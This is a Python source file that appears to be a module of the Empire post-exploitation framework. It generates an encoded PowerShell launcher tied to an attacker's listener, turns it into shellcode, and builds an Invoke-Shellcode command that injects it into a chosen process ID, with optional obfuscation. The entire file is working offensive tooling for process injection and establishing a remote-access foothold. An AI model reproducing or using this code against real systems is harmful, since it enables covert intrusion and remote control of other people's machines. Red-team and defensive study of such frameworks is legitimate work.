from typing import Dict

from empire.server.common import helpers
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # options
        listener_name = params["Listener"]
        proc_id = params["ProcId"].strip()
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        arch = params["Arch"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message(f"[!] Invalid listener: {listener_name}")
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(
                listener_name,
                language="powershell",
                encode=True,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
            )

            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            else:
                launcher_code = launcher.split(" ")[-1]
                sc = main_menu.stagers.generate_powershell_shellcode(
                    launcher_code, arch
                )
                encoded_sc = helpers.encode_base64(sc)

        script_end = '\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String("{}")) -Force'.format(
            proc_id, encoded_sc
        )
        script_end += f"; shellcode injected into pid {str(proc_id)}"

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
